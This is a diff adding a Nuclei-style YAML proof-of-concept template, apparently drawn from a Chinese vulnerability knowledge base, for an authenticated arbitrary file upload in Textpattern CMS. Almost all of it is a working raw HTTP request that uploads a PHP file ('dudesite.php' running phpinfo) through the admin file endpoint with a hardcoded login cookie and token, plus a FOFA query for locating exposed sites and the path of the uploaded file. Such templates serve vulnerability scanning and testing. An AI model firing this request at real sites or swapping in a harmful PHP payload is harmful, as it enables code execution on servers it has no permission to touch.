@@ -1,0 +1,152 @@
+id: poc-dqr1a9f9hew1iwaw
+info:
+  name: textpanttern cms任意文件上传
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dqr1a9f9hew1iwaw'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dqr1a9f9hew1iwaw
+    fofa: app="Textpattern-CMS"
+http:
+- raw:
+  - 'POST /textpattern/textpattern/index.php?event=file HTTP/1.1
+
+
+    Accept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01
+
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    X-Requested-With: XMLHttpRequest
+
+
+    Content-Type: multipart/form-data; boundary=---------------------------50124112016268391132465212078
+
+
+    Connection: close
+
+
+    Cookie: txp_login=admin%2C8303b159c13c22402a789348e7dbd46d; txp_login_public=cfeff738edadmin
+
+
+
+
+    -----------------------------50124112016268391132465212078
+
+
+    Content-Disposition: form-data; name="fileInputOrder"
+
+
+
+
+    1/1
+
+
+    -----------------------------50124112016268391132465212078
+
+
+    Content-Disposition: form-data; name="app_mode"
+
+
+
+
+    async
+
+
+    -----------------------------50124112016268391132465212078
+
+
+    Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+
+
+
+    2000000
+
+
+    -----------------------------50124112016268391132465212078
+
+
+    Content-Disposition: form-data; name="event"
+
+
+
+
+    file
+
+
+    -----------------------------50124112016268391132465212078
+
+
+    Content-Disposition: form-data; name="step"
+
+
+
+
+    file_insert
+
+
+    -----------------------------50124112016268391132465212078
+
+
+    Content-Disposition: form-data; name="id"
+
+
+
+
+
+
+    -----------------------------50124112016268391132465212078
+
+
+    Content-Disposition: form-data; name="_txp_token"
+
+
+
+
+    3026382e9eefd2d3593ad25522d295d4
+
+
+    -----------------------------50124112016268391132465212078
+
+
+    Content-Disposition: form-data; name="thefile[]"; filename="dudesite.php"
+
+
+    Content-Type: application/octet-stream
+
+
+
+
+    <?php phpinfo();?>
+
+
+
+
+    -----------------------------50124112016268391132465212078--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /textpattern/files/dudesite.php'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
